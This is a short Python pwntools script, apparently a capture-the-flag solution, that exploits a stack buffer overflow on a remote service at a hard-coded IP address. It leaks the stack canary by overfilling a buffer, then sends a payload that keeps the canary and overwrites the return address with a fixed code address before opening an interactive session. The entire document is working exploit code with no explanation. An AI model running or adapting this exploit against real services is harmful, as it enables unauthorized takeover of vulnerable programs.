#!/usr/bin/env python2

from pwn import *

if __name__ == "__main__":
	r = remote("125.235.240.171", 1337)
	r.send("1" * 73)
	canary = "\x00" + r.recv()[73:80]
	r.send("\x00" * 72 + canary + "\x00" * 8 + p64(0x4005EB))
	r.interactive()
